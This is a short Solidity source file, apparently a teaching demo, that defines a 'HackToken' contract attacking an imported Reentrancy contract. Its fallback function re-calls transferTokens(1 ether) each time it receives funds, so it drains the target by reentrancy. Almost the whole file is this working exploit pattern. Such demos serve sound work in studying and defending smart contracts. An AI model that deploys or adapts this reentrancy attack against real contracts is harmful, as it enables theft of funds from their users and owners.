pragma solidity ^0.5.2;


import "./Reentrancy.sol";
/// @author Balaji Pachai
/// @dev HackToken
/// @dev A contract that pull in all the tokens from the Reentrancy contract
contract HackToken {
    Reentrant public rentrancyAddress;
    uint256 public contractBalance = address(this).balance;

    /// @dev constructor that sets the Reentrancy contract address
    constructor (address rentrancyContractAddress) public {
        rentrancyAddress = Reentrant(rentrancyContractAddress);
    }

    /// @dev Function that deposits tokens into the Reentrancy contract
    function deposit(uint256 noOfTokens) public {
        rentrancyAddress.depositTokens(noOfTokens);
    }

    /// @dev Function that invokes re-entrancy transferTokens function
    function transfer() payable public {
        rentrancyAddress.transferTokens(1 ether);
    }

    /// @dev Function that pulls in tokens from
    function() external payable { 
        rentrancyAddress.transferTokens(1 ether);
    }
}

